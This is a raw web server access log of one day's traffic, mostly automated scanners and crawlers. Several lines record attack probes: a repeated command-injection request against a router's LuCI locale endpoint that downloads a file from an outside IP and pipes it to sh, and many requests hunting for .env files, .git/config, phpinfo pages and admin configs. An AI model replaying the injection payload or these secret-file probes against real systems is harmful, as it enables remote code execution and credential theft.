::ffff:87.120.115.34 - - [18/Dec/2024:08:14:15 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
::ffff:167.99.214.236 - - [18/Dec/2024:08:18:25 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 Keydrop"
::ffff:18.143.74.234 - - [18/Dec/2024:08:20:02 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.10) Gecko/2009042316 Firefox/3.0.10"
::ffff:59.183.102.110 - - [18/Dec/2024:08:20:09 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:18.143.74.234 - - [18/Dec/2024:08:20:26 +0000] "GET //cdn.js HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36"
::ffff:181.49.205.58 - - [18/Dec/2024:08:20:43 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 404 23 "-" "nvdorz"
::ffff:18.143.74.234 - - [18/Dec/2024:08:20:56 +0000] "GET //cdn.js HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Linux; Android 10; BLA-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36"
::ffff:18.143.74.234 - - [18/Dec/2024:08:21:22 +0000] "GET //cdn.js HTTP/1.1" 404 23 "-" "wii libnup/1.0"
::ffff:141.98.11.155 - - [18/Dec/2024:08:21:38 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:18.143.74.234 - - [18/Dec/2024:08:21:46 +0000] "GET //cdn.js HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Linux; Android 12; SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Mobile Safari/537.36 EdgA/101.0.1210.39"
::ffff:18.143.74.234 - - [18/Dec/2024:08:22:15 +0000] "GET //cdn.js HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
::ffff:18.143.74.234 - - [18/Dec/2024:08:22:35 +0000] "GET //cdn.js HTTP/1.1" 404 23 "-" "SEC-SGHX210/1.0 UP.Link/6.3.1.13.0"
::ffff:95.214.53.205 - - [18/Dec/2024:08:26:40 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:31.220.1.88 - - [18/Dec/2024:08:36:11 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:80.94.93.191 - - [18/Dec/2024:08:38:13 +0000] "GET / HTTP/1.0" 200 2179 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::ffff:95.214.55.74 - - [18/Dec/2024:08:39:49 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:199.127.63.64 - - [18/Dec/2024:08:46:11 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" - - "-" "-"
::ffff:171.244.43.14 - - [18/Dec/2024:09:04:16 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
::ffff:171.244.43.14 - - [18/Dec/2024:09:04:16 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"
::ffff:89.104.110.246 - - [18/Dec/2024:09:07:56 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
::ffff:89.104.101.119 - - [18/Dec/2024:09:07:56 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
::ffff:125.229.243.163 - - [18/Dec/2024:09:08:11 +0000] "GET / HTTP/1.0" 200 2179 "-" "Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
::ffff:176.53.218.182 - - [18/Dec/2024:09:11:41 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
::ffff:89.104.101.176 - - [18/Dec/2024:09:11:41 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36"
::ffff:95.214.55.74 - - [18/Dec/2024:09:27:46 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:185.191.126.213 - - [18/Dec/2024:09:33:04 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:66.132.153.54 - - [18/Dec/2024:09:43:51 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:66.132.153.54 - - [18/Dec/2024:09:43:55 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:66.132.153.54 - - [18/Dec/2024:09:43:55 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:147.185.132.155 - - [18/Dec/2024:09:44:39 +0000] "GET / HTTP/1.1" 200 2179 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:34.76.105.151 - - [18/Dec/2024:09:52:01 +0000] "GET / HTTP/1.1" 200 2179 "-" "python-requests/2.32.3"
::ffff:95.214.55.74 - - [18/Dec/2024:09:56:04 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:52.167.144.161 - - [18/Dec/2024:10:00:23 +0000] "GET /signup HTTP/1.1" 200 2445 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
::ffff:52.167.144.161 - - [18/Dec/2024:10:01:29 +0000] "GET /css/main.css HTTP/1.1" 200 459 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
::ffff:52.167.144.161 - - [18/Dec/2024:10:01:30 +0000] "GET /css/main.css HTTP/1.1" 200 459 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
::ffff:64.23.201.216 - - [18/Dec/2024:10:29:09 +0000] "GET /admin/config.php HTTP/1.0" 404 23 "-" "xfa1"
::ffff:167.94.145.102 - - [18/Dec/2024:10:38:18 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:167.94.145.102 - - [18/Dec/2024:10:38:23 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.102 - - [18/Dec/2024:10:38:25 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:31.220.1.88 - - [18/Dec/2024:10:38:29 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:147.45.185.25 - - [18/Dec/2024:11:12:10 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0(Linux;Android5.0.2;SM-S920LBuild/LRX22G)AppleWebKit/537.36(KHTML,likeGecko)SamsungBrowser/3.2Chrome/38.0.2125.102MobileSafari/537.36"
::ffff:147.45.185.25 - - [18/Dec/2024:11:12:10 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0(Linux;Android5.0.2;SM-S920LBuild/LRX22G)AppleWebKit/537.36(KHTML,likeGecko)SamsungBrowser/3.2Chrome/38.0.2125.102MobileSafari/537.36"
::ffff:80.82.77.202 - - [18/Dec/2024:11:12:18 +0000] "GET / HTTP/1.0" 200 2179 "-" "Mozilla/5.0 (Linux; Android 8.0.0; MI 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36"
::ffff:147.45.185.25 - - [18/Dec/2024:11:12:24 +0000] "GET /css/main.css HTTP/1.1" 200 459 "-" "Mozilla/5.0 (iPad; CPU OS 3_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/1.0 Mobile/11A465 Safari/9537.53"
::ffff:181.49.205.58 - - [18/Dec/2024:11:12:51 +0000] "GET /admin/config.php HTTP/1.0" 404 23 "-" "nvdorz"
::ffff:172.212.58.224 - - [18/Dec/2024:11:13:16 +0000] "GET /hudson HTTP/1.1" 404 23 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:51.222.253.7 - - [18/Dec/2024:11:14:47 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:54.36.149.0 - - [18/Dec/2024:11:14:58 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
::ffff:31.220.1.88 - - [18/Dec/2024:11:17:36 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:185.191.126.213 - - [18/Dec/2024:11:18:27 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:181.49.205.58 - - [18/Dec/2024:11:18:36 +0000] "GET /admin/config.php HTTP/1.0" 404 23 "-" "xfa1"
::ffff:95.214.53.205 - - [18/Dec/2024:11:33:41 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:95.214.55.74 - - [18/Dec/2024:11:34:18 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:95.214.55.43 - - [18/Dec/2024:11:39:59 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:154.213.187.122 - - [18/Dec/2024:12:08:54 +0000] "GET /login.rsp HTTP/1.1" 404 23 "-" "Hello World"
::ffff:95.214.55.74 - - [18/Dec/2024:12:13:52 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:85.215.201.92 - - [18/Dec/2024:12:21:40 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
::ffff:95.214.53.91 - - [18/Dec/2024:12:21:50 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:31.220.1.88 - - [18/Dec/2024:12:27:59 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+http%3A%2F%2F103.149.87.69%2Ft+-O-+|+sh%60) HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:51.159.23.43 - - [18/Dec/2024:12:38:58 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:80.94.93.191 - - [18/Dec/2024:12:48:18 +0000] "GET / HTTP/1.0" 200 2179 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::ffff:138.246.253.24 - - [18/Dec/2024:12:54:03 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
::ffff:95.214.55.74 - - [18/Dec/2024:12:58:08 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:154.213.187.237 - - [18/Dec/2024:12:58:29 +0000] "GET /login.rsp HTTP/1.1" 404 23 "-" "Hello World"
::ffff:95.214.53.205 - - [18/Dec/2024:12:58:48 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:95.214.55.79 - - [18/Dec/2024:13:09:45 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:64.23.201.216 - - [18/Dec/2024:13:13:23 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 404 23 "-" "nvdorz"
::ffff:46.19.138.234 - - [18/Dec/2024:13:14:02 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:95.214.55.74 - - [18/Dec/2024:13:16:22 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:207.241.236.83 - - [18/Dec/2024:13:25:08 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot) Zeno/76f39f7 warc/v0.8.53"
::ffff:40.118.132.120 - - [18/Dec/2024:13:30:13 +0000] "GET /portal/redlion HTTP/1.1" 404 23 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:185.191.126.213 - - [18/Dec/2024:13:30:41 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:92.255.57.58 - - [18/Dec/2024:13:45:28 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:207.241.225.134 - - [18/Dec/2024:13:54:56 +0000] "GET / HTTP/1.1" 200 2179 "-" "Go-http-client/1.1"
::ffff:64.23.201.216 - - [18/Dec/2024:14:08:41 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 404 23 "-" "xfa1"
::ffff:181.49.205.58 - - [18/Dec/2024:14:23:04 +0000] "GET /admin/config.php HTTP/1.0" 404 23 "-" "nvdorz"
::ffff:141.98.11.155 - - [18/Dec/2024:14:26:23 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:92.255.57.58 - - [18/Dec/2024:14:36:01 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
::ffff:70.39.75.141 - - [18/Dec/2024:14:42:22 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 Keydrop"
::ffff:178.215.236.240 - - [18/Dec/2024:14:50:36 +0000] "GET /.git/config HTTP/1.1" 200 283 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-T819) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Safari/537.36"
::ffff:95.214.53.205 - - [18/Dec/2024:15:00:29 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:217.160.202.182 - - [18/Dec/2024:15:03:12 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.54"
::ffff:157.55.39.196 - - [18/Dec/2024:15:05:04 +0000] "GET /blog HTTP/1.1" 200 73577 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/116.0.1938.76 Safari/537.36"
::ffff:207.90.244.5 - - [18/Dec/2024:15:22:55 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
::ffff:207.90.244.5 - - [18/Dec/2024:15:22:56 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "-"
::ffff:207.90.244.5 - - [18/Dec/2024:15:22:56 +0000] "GET /sitemap.xml HTTP/1.1" 404 23 "-" "-"
::ffff:207.90.244.5 - - [18/Dec/2024:15:22:56 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 23 "-" "-"
::ffff:207.90.244.5 - - [18/Dec/2024:15:22:57 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36"
::ffff:172.206.143.92 - - [18/Dec/2024:15:34:14 +0000] "GET /version HTTP/1.1" 404 23 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:95.214.55.74 - - [18/Dec/2024:15:39:58 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:80.94.93.191 - - [18/Dec/2024:15:43:36 +0000] "GET / HTTP/1.0" 200 2179 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::ffff:152.42.189.50 - - [18/Dec/2024:15:43:52 +0000] "GET /wp-admin/setup-config.php?step=1 HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
::ffff:152.42.189.50 - - [18/Dec/2024:15:43:52 +0000] "GET /wordpress/wp-admin/setup-config.php?step=1 HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Linux; Android 5.1.1; SM-J111F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.90 Mobile Safari/537.36"
::ffff:66.132.153.61 - - [18/Dec/2024:15:46:59 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:66.132.153.61 - - [18/Dec/2024:15:47:02 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:66.132.153.61 - - [18/Dec/2024:15:47:03 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.101 - - [18/Dec/2024:16:00:21 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:167.94.145.101 - - [18/Dec/2024:16:00:26 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:167.94.145.101 - - [18/Dec/2024:16:00:27 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
::ffff:154.213.187.122 - - [18/Dec/2024:16:09:41 +0000] "GET /login.rsp HTTP/1.1" 404 23 "-" "Hello World"
::ffff:95.214.53.205 - - [18/Dec/2024:16:33:36 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:95.214.55.74 - - [18/Dec/2024:16:36:52 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:57 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; U; Linux i686; fi-FI; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:57 +0000] "GET /demo/.env HTTP/1.1" 404 23 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; WinNT-EVI 19.12.2009; AskTbEPC/5.14.1.20007)"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:57 +0000] "GET /dev/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (undefined) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36 OPR/37.0.2178.43"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:58 +0000] "GET /doc/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:58 +0000] "GET /docs/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.6) Gecko/20050311 Firefox/1.0.1"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:59 +0000] "GET /download/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.119 Safari/537.36 OPR/51.0.2830.26"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:59 +0000] "GET /env/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:59 +0000] "GET /frontend/web/debug/default/view HTTP/1.1" 404 23 "-" "Opera/9.25 (OpenSolaris; U; en)"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:59 +0000] "GET /html/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; en-GB; rv:1.9.2.24) Gecko/20111103 Firefox/3.6.24"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:59 +0000] "GET /inc/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.55.3 (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:59 +0000] "GET /info/ HTTP/1.1" 404 23 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.25 (KHTML, like Gecko) Version/11.0 Mobile/15A5304j Safari/604.1"
::ffff:78.153.140.223 - - [18/Dec/2024:16:46:59 +0000] "GET /infophp.php HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_8; zh-cn) AppleWebKit/533.18.1 (KHTML, like Gecko) Version/5.0.2 Safari/533.18.5"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:00 +0000] "GET /infos.php HTTP/1.1" 404 23 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C)"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:00 +0000] "GET /infos/ HTTP/1.1" 404 23 "-" "Mozilla/5.0 (iPad; CPU OS 9_0 like Mac OS X) AppleWebKit/601.1.17 (KHTML, like Gecko) Version/8.0 Mobile/13A175 Safari/600.1.4"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:00 +0000] "GET /lib/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:32.0) Gecko/20100101 Firefox/32.0"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:01 +0000] "GET /library/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/603.1.30 (KHTML, like Gecko) Version/10.1 Safari/603.1.30"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:01 +0000] "GET /logging/.env HTTP/1.1" 404 23 "-" "Opera/9.21 (Windows NT 5.1; U; en)"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:02 +0000] "GET /media/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; U; Linux; i686; en-US; rv:1.6) Gecko Galeon/1.3.14"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:37 +0000] "GET /misc/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:44 +0000] "GET /new/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:50 +0000] "GET /phpinfo.php HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36 OPR/32.0.1948.69"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:52 +0000] "GET /phpinfos/ HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; it-IT) AppleWebKit/533.20.25 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:53 +0000] "GET /pinfo.php HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.5) Gecko/2008121911 CentOS/3.0.5-1.el5.centos Firefox/3.0.5"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:54 +0000] "GET /production/.env HTTP/1.1" 404 23 "-" "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0; SV1)"
::ffff:78.153.140.223 - - [18/Dec/2024:16:47:55 +0000] "GET /public/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36"
::ffff:92.249.48.38 - - [18/Dec/2024:16:47:57 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:05 +0000] "GET /public_html/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.8.1.20) Gecko/20081217 Firefox/2.0.0.21"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:05 +0000] "GET /server/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows 2000; U) Opera 6.03  [en]"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:11 +0000] "GET /shared/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; Linux i686; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:13 +0000] "GET /site/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Linux; Android 4.0.3; HTC Sensation Z710e Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.107 Mobile Safari/537.36 OPR/29.0.1809.93516"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:19 +0000] "GET /stage/.env HTTP/1.1" 404 23 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.01"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:23 +0000] "GET /staging/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Linux; Android 6.0; Android SDK built for x86 Build/MASTER; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/44.0.2403.119 Mobile Safari/537.36"
